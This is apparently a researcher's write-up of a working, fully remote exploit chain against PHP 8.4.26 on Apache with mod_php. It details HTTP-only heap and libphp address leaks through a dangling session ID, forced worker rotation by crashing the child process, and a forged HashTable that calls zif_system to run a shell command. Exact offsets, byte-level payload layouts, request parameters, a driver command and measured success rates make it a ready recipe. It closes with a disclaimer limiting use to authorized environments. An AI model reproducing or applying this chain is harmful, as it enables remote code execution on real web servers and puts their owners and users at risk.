# Pure HTTP ASLR RCE: Two `Set-Cookie` Leaks + `zif_system`

Date: 2026-10-21
Target: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (Debian 12 amd64, `172.16.0.103`)
Constraints: **fully remote, HTTP only; the target webroot contains only ordinary pages (no dedicated PHP file)**.
Status: **The full ASLR-on chain works end to end, and every attack request in the chain is pure HTTP: 9/10 in the lab (with initial rotation) / 5/5 (without)**. Addresses come from two pure HTTP leaks (Zend MM chunk base, libphp base); the terminal uses `zif_system` (no libc needed). Worker rotation between stages is also triggered over HTTP: `A_bigfields` (3MB live POST field + OOM) corrupts the Zend MM heap, and an immediately following B request that initializes a session makes the child `SIGABRT`, whereupon prefork forks a new worker with an identical address space.

> Terminology: "pure HTTP" in this document means the **attack request chain** uses only HTTP. The lab driver still restarts Apache once at the start to obtain a clean master and uses `cat /tmp/p1` to verify the result; these two steps are lab-environment operations and are not part of the attack chain. The attack chain itself (leak, rotation, execution) contains no local signals.

---

## 1. Conclusion

Three request sequences (each an ordinary multipart POST to `index.php`):

| Stage | Request A | Request B | Output |
|---|---|---|---|
| 1 | `send_a_leak2.py 1001 12` | `b_numleak2.py 892 1 0x1000` | Zend MM chunk base |
| 2 | `send_a_leak3.py 1001 5 39 12 17` | `b_target.py 443 16 983` | libphp base |
| 3 | `send_a_pad.py 17 19 3 12` + `8:7` + 5×`7:7` | `send_b_zif.py 15 2 <HT> <ZIF>` | `id>/tmp/p1` |

The mechanism and evidence for stage 1 are in [HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md).
This document covers stages 2 and 3 and the full driver.

Measured (ASLR enabled, `personality=00000000`):

```text
W1=869675 chunk=0x7f4922200000 attempt=1
W2=869737 libphp=0x7f4923a00000 attempt=1
W3=869807 HTDATA=0x7f492226e0d8 ZIF=0x7f4923e3a870 attempt=1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
FULL_CHAIN_OK=5/5            # no initial rotation (after restart the worker itself is fresh)
FULL_PURE_HTTP_OK=9/10       # with initial HTTP rotation (removes dependence on initial history)
```

The rotation primitive measured separately:

```text
A_bigfields + session B -> child exit signal Abort (6) -> prefork respawn
fresh worker 10/10; after a leak 5/5; heap leak again after rotation 5/5
```

Under ASLR, the stage 2 libphp leak matches `/proc/<worker>/maps` exactly:

```text
Set-Cookie: PHPSESSID=%10%00%00%00%00%00%00%00P%3C%A1%87r%7F%00%00
Decoded: 10 00 00 00 00 00 00 00 | 50 3c a1 87 72 7f 00 00
pDestructor = 0x7f7287a13c50
libphp      = 0x7f7287400000
maps: 7f7287400000-7f728754f000 r--p ... /usr/lib/apache2/modules/libphp.so
```

---

## 2. Stage 2: Pure HTTP leak of a libphp code pointer

### 2.1 Approach

Stage 1 already showed that the `len` of a dangling `PS(id)` can be hijacked, making `php_url_encode` perform an out-of-bounds read.
This stage changes "where to read" to a **56B HashTable page** and changes `len` from a "forged huge value" to a **small integer field** in the HashTable:

- B uses nested arrays `aNNNN[k]` to lay out many 56B HashTable pages in the chunk; each page holds 73 HashTables, with `pDestructor = ZVAL_PTR_DTOR = libphp + 0x613c50`.
- A's shape (1001 fields with 39-byte values) places the dangling `PS(id)` at
  `chunk + 0xb7400` (page `0xb7000`, offset `+0x400` within the page).
- In B's layout, this address is exactly at `+0x20` of the HashTable for `$_POST['a0443']`:
  `PS(id)+0x10` reads `nTableSize | nInternalPointer`.
- Expanding `a0443` to 16 elements (`nTableSize=16`, `nInternalPointer=0`) gives
  `ZSTR_LEN(PS(id)) = 16`; the data starts at `PS(id)+0x18` and exactly covers
  `nNextFreeElement` (8B) and `pDestructor` (8B).

Layout (relative to the chunk base):

```text
PS(id)          = chunk + 0xb7400
PS(id)+0x10     = HT + 0x20  -> nTableSize(16) | nInternalPointer(0) = 16  (len)
PS(id)+0x18     = HT + 0x28  -> nNextFreeElement (0x10)
HT + 0x30       = pDestructor = ZVAL_PTR_DTOR (libphp+0x613c50)
```

Constraints for `b_target.py`:

```text
983 arrays a0000..a0982; a0443 has 16 elements, the rest have 1 each
total fields = 982 + 16 = 998; plus PHPSESSID/PROGRESS gives 1000 POST variables
=> does not trigger B's own max_input_vars warning (otherwise headers_sent would prevent the cookie from being sent)
```

### 2.2 Calibration log (no-ASLR)

- After `send_a_leak3.py 1001 5 39 12 17`, `ps_globals.id = 0x7ffff5eb7400`
  (chunk+0xb7400), `send_cookie=1`.
- In the original B with 998 `aNNNN[0]`, chunk page `0xb7000` is a 56B HashTable page;
  the HashTable at `+0x3f0` of that page belongs to `$_POST['a0443']` (identified by
  reverse lookup of the parent bucket's key `a0443`).
- After changing a0443 to 16 elements while keeping the rest at 1, `Send-Cookie`
  changes from the normal 32-character id to:

  ```text
  %10%00%00%00%00%00%00%00P%3C%A1%F4%FF%7F%00%00
  => nNextFreeElement=0x10 | pDestructor=0x7ffff4a13c50
  ```

- This pDestructor is exactly libphp's `ZVAL_PTR_DTOR` (`zval_ptr_dtor`),
  offset `0x613c50`. The libphp base is 2MB-aligned, which serves as a leak check:
  `(pDestructor - 0x613c50) & 0x1fffff == 0` and
  `pDestructor & 0x1fffff == 0x13c50`.

### 2.3 Request details

A (`send_a_leak3.py 1001 5 39 12 17`):

- 1001 ordinary fields (5-character names, 39-byte values) → the 1001st triggers a
  `max_input_vars` warning (display_errors=On → headers_sent=1);
- The `PHPSESSID` value is the single byte `\x00` → FILE_START generates a new random id,
  `send_cookie=1`, and `php_session_reset_id` fails because headers_sent is set;
- File field + 12MB field → OOM; `PS(id)` is left dangling at address `chunk+0xb7400`.

B (`b_target.py 443 16 983`):

- No file field; pre-RINIT END cleanup calls `php_session_initialize()`;
- `reset_id` sends `Set-Cookie` using the dangling `PS(id)`;
- `php_url_encode(ZSTR_VAL(id), ZSTR_LEN(id))` reads 16 bytes:
  `nNextFreeElement` + `pDestructor`;
- Afterwards the id check in `ps_files_open` fails, producing a
  `Session ID is too long or contains illegal characters` warning;
  this does not affect the response headers already sent.

---

## 3. Stage 3: `zif_system` terminal

### 3.1 Why not libc

Stages 1/2 leaked only the heap and libphp; the chunk scan found no libc pointers. The terminal therefore uses
PHP's own internal function handler `zif_system` (libphp + `0x43a870`) and does not
need a `system`/libc address.

Calling convention of `zif_system(zend_execute_data *execute_data, zval *return_value)`:

- `pDestructor(&bucket->val)` deterministically provides only `rdi = &bucket->val`;
- `&bucket->val` is disguised as a `zend_execute_data`, with `num_args=1`, and
  `arg1` is a zval pointing to a fake `zend_string` whose contents are the command;
- after executing the command, `zif_system` may crash while writing the return value
  to the uncontrolled `rsi`, but the command has already run (the same as the g18
  `/proc/self/maps` version).

### 3.2 Compact payload (167 bytes, entirely inside a live 192B zend_string)

Exploit B's fake HashTable is placed in a live 167-byte field-value string
(`chunk + 0x6e0d8`); a 55B raw buffer for the fake reference overwrites
the dangling reference at `R0 = chunk + 0x24e0`.

```text
data+0x00: gc refcount=1, type=IS_ARRAY(7)
data+0x08: flags=0x10, nTableMask=0xfffffff8
data+0x10: arData = data+0x20
data+0x18: nNumUsed=1, nNumOfElements=1
data+0x20: nTableSize=8, nInternalPointer=0
data+0x28: nNextFreeElement=0
data+0x30: pDestructor = zif_system          (== execute_data+0x10)
data+0x20: execute_data E (0x50 bytes)
  E+0x10: return_value = zif_system          (overlaps with HT pDestructor)
  E+0x2C: num_args = 1
  E+0x50: arg1 zval { value=data+0x80, type=IS_STRING(6) }
data+0x80: fake zend_string { gc 1/0x106, h=0, len=10, chars at 0x98 }
data+0x98: "id>/tmp/p1\0"
```

Fake reference (55B raw buffer, starting at `R0-0x10`):

```text
+0x10: gc refcount=1, type=IS_REFERENCE(10)
+0x18: val.value = chunk+0x6e0d8
+0x20: val.type  = 0x307 (IS_ARRAY_EX)
+0x28: sources   = 0
```

Trigger chain:

```text
php_session_track_init()
  zval_ptr_dtor(PS(http_session_vars))     # refcount 1 -> 0
    zend_reference_destroy(R0)
      zval_ptr_dtor(&ref->val)             # IS_ARRAY_EX
        zend_array_destroy(fake HT)
          zend_hash_destroy(fake HT)
            pDestructor(&bucket->val)      # = zif_system
              zif_system(execute_data)     # "id>/tmp/p1"
```

### 3.3 Exploit request shapes (calibrated with `use_cookies=1`)

- A: `send_a_pad.py 17 19 3 12 8:7 7:7 7:7 7:7 7:7 7:7`
  - 6 pads make the dangling reference `R0 = chunk + 0x24e0`,
    and `R0-0x10` is the start of a 56B block;
- B: `send_b_zif.py 15 2 <HTDATA> <ZIF> "id>/tmp/p1"`
  - With `N1=15` (31-character priming field), the 55B fake-ref raw buffer lands at `R0-0x10`;
  - `HTDATA = chunk+0x6e0d8` (live 167B string data);
  - `ZIF = libphp+0x43a870`.

> Note: changing `use_cookies` from 0 to 1 moves B's 56B landing site from `N1=16` to
> `N1=15` and changes some of the leak A offsets; all parameters above were measured with `use_cookies=1`.

---

## 4. Full driver

`tools/pure_aslr_run.sh`:

1. Restart Apache (ASLR enabled, single-worker prefork);
2. Stage 1: `send_a_leak2 + b_numleak2`, parse the chunk base from `Set-Cookie`
   (2MB-aligned mode); retry 3 times on failure;
3. Rotate the worker (HTTP): `send_a_bigfields 1001 3000 12 17` →
   `sup_poc.py b`, wait for prefork to fork a new child;
4. Stage 2: `send_a_leak3 + b_target`, parse
   `pDestructor`, verify `p & 0x1fffff == 0x13c50`; retry 3 times on failure;
5. Rotate the worker (as above);
6. Stage 3: `send_a_pad + send_b_zif`, check `/tmp/p1`; retry 5 times on failure.

By default the driver also performs an HTTP rotation before stage 1, first killing the current child that may already have history, so that the first-stage layout depends only on this chain's request sequence.

```bash
# target machine
cd ~/php2shell-work
CMD="id>/tmp/p1" bash pure_aslr_run.sh
```

Measured output (5/5):

```text
W1=... chunk=0x...
W2=... libphp=0x...
W3=... HTDATA=0x... ZIF=0x... attempt=1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Evidence archive: `logs/pure_http_aslr_20261021.txt`;
raw libphp leak response: `logs/libphp_leak_20261021.resp`.

---

## 5. Worker rotation and ASLR base stability

- Under the same Apache master, children re-forked by prefork inherit the same
  **libphp/libc** mappings; the Zend MM chunk is mmap'd on the child's first request.
  Measured: after restarting the worker, both the chunk base and the libphp base
  remain unchanged:

  ```text
  W1 chunk=0x7f5555e00000 libphp=0x7f5553a00000
  W2 chunk=0x7f5555e00000 libphp=0x7f5553a00000   # after the child is aborted/forked
  ```

- A **fresh worker** is required between stages: each stage's A/B offsets are calibrated on "the worker's
  first request". Once the worker has served a leak request, A's dangling reference address
  moves (measured: `R0` moves from `chunk+0x24e0` to `chunk+0x14e0`), and the old B landing site
  no longer works.
- **Pure HTTP rotation (implemented)**: `A_bigfields` sends 1001 ordinary fields (the first 1000
  are registered as `$_POST`, 3000 bytes each) → FILE_START creates a new id → the 12MB field OOMs.
  The 3MB live string + OOM corrupts the Zend MM heap state; an immediately following B that
  initializes a session (`sup_poc.py b`: PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS, no file field,
  goes through pre-RINIT END cleanup) triggers `zend_mm_panic`/`abort()`, the child exits with
  **SIGABRT**, and prefork immediately forks a new child. Log confirmation:

  ```text
  [core:notice] child pid ... exit signal Abort (6)
  ```

  Measured: fresh worker 10/10, after a leak 5/5, heap leak again after rotation 5/5.
- The new child after rotation shares the old child's mmap layout under the same master, so the chunk base
  and libphp base remain unchanged; this is the precondition for "leak once, change worker, keep using".
- By default the driver also performs an HTTP rotation before stage 1, so even if the target worker has already served unknown
  requests, the first-stage layout depends only on this chain's request sequence.

---

## 6. Limitations

1. Requires `display_errors=On` (A in stages 1/2 needs warning output to set
   `headers_sent=1`).
   > 2026-10-21 update: an OOM-in-cookie variant that does not depend on `display_errors` has moved A's
   > OOM into `php_session_send_cookie→php_url_encode` (bin 128 empty +
   > free pages exhausted), and on the B side traverses the dangling `PS(mod_data)` and calls
   > `send_cookie` with the dangling id; what remains is calibration of the forged dangling id block. See
   > [DISPLAY_ERRORS_OFF.md](/Users/my/php2shell/DISPLAY_ERRORS_OFF.md) for details.
2. Requires `session.use_cookies=1` (default), `session.use_strict_mode=0`
   (default), `max_input_vars=1000` (default), and `memory_limit=8M` (lab).
3. All chunk/module-internal offsets are tied to this PHP 8.4.26 build and request shapes:

   ```text
   chunk+0xb7400   stage-2 stale PS(id)
   chunk+0xb73f0   target HashTable (a0443)
   chunk+0x6e0d8   stage-3 fake HashTable string data
   chunk+0x24e0    stage-3 stale reference R0
   libphp+0x613c50 ZVAL_PTR_DTOR
   libphp+0x43a870 zif_system
   ```

   Changing the build/field lengths/request order requires recalibration using the gdb method in `logs`; these offsets are all
   chunk/module-relative values and are independent of ASLR.
4. After command execution the worker crashes in the final `pefree` of `zend_hash_destroy`;
   the proof has already been written, matching the expectation for a one-shot exploit.
5. The A shapes for stages 1 and 2 differ, but both build on the same "headers_sent + empty
   PHPSESSID + OOM" primitive; both require A to be a fresh request on the worker. Freshness is ensured by
   HTTP rotation: `send_a_bigfields.py 1001 3000 12 17` (~3MB field request body)
   + `sup_poc.py b`. This rotation relies on `memory_limit=8M` to make the 12MB field OOM and on the
   next request aborting during Zend MM cleanup.
6. Success rate (lab, ASLR-on): **5/5** without initial rotation; with initial rotation (removing dependence on initial
   history) **9/10**. Failures are mainly timing/retry issues; the driver has built-in stage-level retries; well above
   the "one in ten" requirement.
7. If the target's `memory_limit` is large, the OOM in `A_bigfields` requires a larger trailing field;
   the rotation primitive requires "exhaust/corrupt the heap first, then let session initialization trigger abort", and both must be
   recalibrated for the target configuration.

---

## 7. Files

| File | Purpose |
|---|---|
| `tools/pure_aslr_run.sh` | Full-chain driver (leak→rotation→exploit, with verification/retries) |
| `tools/send_a_leak2.py` | Stage 1 A (heap leak prime) |
| `tools/b_numleak2.py` | Stage 1 B (80B raw forge + out-of-bounds read) |
| `tools/decode_leak.py` | Stage 1 response decoding/chunk base |
| `tools/send_a_leak3.py` | Stage 2 A (`PS(id)=chunk+0xb7400`) |
| `tools/b_target.py` | Stage 2 B (expand a0443 to 16 elements → leak pDestructor) |
| `tools/send_a_pad.py` | Stage 3 A (6 pads + file + OOM) |
| `tools/send_b_zif.py` | Stage 3 B (compact zif_system payload) |
| `tools/send_b_rce2.py` | Legacy system terminal (no-ASLR baseline/crash experiments) |
| `tools/send_a_bigfields.py` | HTTP rotation A (3MB live field + OOM) |
| `tools/sup_poc.py` | HTTP rotation B (session initialization triggers SIGABRT) |
| `tools/b_crash7.py` | Early HTTP crash primitive experiment (7-character live string) |
| `logs/http_heap_leak_20261021.resp/.txt` | Stage 1 raw response/decoding |
| `logs/libphp_leak_20261021.resp` | Stage 2 raw response |
| `logs/pure_http_aslr_20261021.txt` | Pure HTTP full-chain run log (5/5, 9/10) |

---

## 8. Disclaimer

For vulnerability research and reproduction in authorized environments only. Request shapes, bin
sequences, and offsets are tied to this lab's PHP 8.4.26 build and Apache/mod_php configuration;
changing the build or configuration requires recalibration.
